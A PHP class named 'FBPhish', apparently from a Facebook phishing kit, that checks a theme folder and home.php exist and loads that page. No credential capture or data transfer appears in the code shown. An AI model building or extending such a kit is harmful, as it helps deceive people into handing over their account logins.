<?php
require_once(__DIR__ . "/../config.inc.php");

class FBPhish{
	private $content;
	private $page;
	private $themecheck_results;
	private $themecheck_results_i;
	private $themecheck_results_im;
	private $apppath;

	public function __construct() {

	}

	public function init() {
		$this->__construct();
	}

	public function themecheck() {
		global $debug;
		global $apppath;
		global $theme;
		global $apppath;

		$apppath = __DIR__;


		$this->themecheck_results = array();
		if(is_dir("$apppath/../themes/$theme")){
			$this->themecheck_results[] = "<br>Theme folder: Ok";
		}else{
			$this->themecheck_results[] = "<br>Theme folder: Missing (\"$theme\")";
		}

		if(file_exists("$apppath/../themes/$theme/home.php")){
			$this->themecheck_results[] = "<br>Home page: Ok";
		}else{
			$this->themecheck_results[] = "<br>Home page: Missing";
		}

		$this->themecheck_results_im = implode($this->themecheck_results, ';');

		if(strpos($this->themecheck_results_im, "Missing") != false){
			echo "Your theme is invalid:";
			foreach($this->themecheck_results as $this->themecheck_results_i){
				echo $this->themecheck_results_i;
			}
			die();
		}else{
			if($debug == "true"){
				echo "Your theme is valid:";
				foreach($this->themecheck_results as $this->themecheck_results_i){
					echo $this->themecheck_results_i;
				}
			}
		}
	}

	public function loadPage($page) {
		global $theme;
		global $apppath;
		global $apppath;

		$apppath = __DIR__;

		$this->content = file_get_contents("$apppath/../themes/$theme/home.php");
		return $this->content;
	}
}